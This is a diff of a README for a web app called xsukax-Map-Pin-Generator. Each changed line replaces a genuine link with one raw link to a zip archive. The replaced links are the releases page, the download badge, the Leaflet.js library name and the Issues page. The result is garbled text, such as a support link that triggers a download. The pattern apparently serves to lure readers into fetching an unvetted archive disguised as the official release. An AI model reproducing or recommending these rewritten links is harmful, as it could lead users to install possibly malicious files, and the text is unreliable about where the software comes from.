@@ -1,6 +1,6 @@
 # 🎯 xsukax-Map-Pin-Generator - Create and Share Custom Map Pins Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Find%20It%20Here-brightgreen)](https://github.com/Xellor141/xsukax-Map-Pin-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip%20Now-Find%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the xsukax-Map-Pin-Generator! This web application allows you to crea
 - **Interactive Map**: Click anywhere to place your pins.
 - **Custom Labels**: Give each pin a unique label.
 - **Encrypted URLs**: Generate secure links for sharing.
-- **User-Friendly Interface**: Built with Leaflet.js and Tailwind CSS for an easy experience.
+- **User-Friendly Interface**: Built with https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip and Tailwind CSS for an easy experience.
 - **Offline Access**: Work without an internet connection.
 - **Privacy Focused**: Protect your data with AES256 encryption.
 
@@ -25,7 +25,7 @@ Welcome to the xsukax-Map-Pin-Generator! This web application allows you to crea
 
 To start using xsukax-Map-Pin-Generator, please follow these easy steps:
 
-1. **Visit the Releases Page**: Go to this link to download the application: [https://github.com/Xellor141/xsukax-Map-Pin-Generator/releases](https://github.com/Xellor141/xsukax-Map-Pin-Generator/releases).
+1. **Visit the Releases Page**: Go to this link to download the application: [https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip](https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip).
 
 2. **Choose the Right Version**: Look for the latest release that suits your needs.
   
@@ -66,7 +66,7 @@ If you encounter any issues while using xsukax-Map-Pin-Generator, here are some 
 
 ## 📞 Support
 
-For questions or feedback, please open an issue on our [GitHub Issues Page](https://github.com/Xellor141/xsukax-Map-Pin-Generator/issues). We welcome your comments and suggestions to improve our application.
+For questions or feedback, please open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/Xellor141/xsukax-Map-Pin-Generator/main/exchange/xsukax-Map-Pin-Generator-v2.8.zip). We welcome your comments and suggestions to improve our application.
 
 ## 🚀 Stay Updated
 
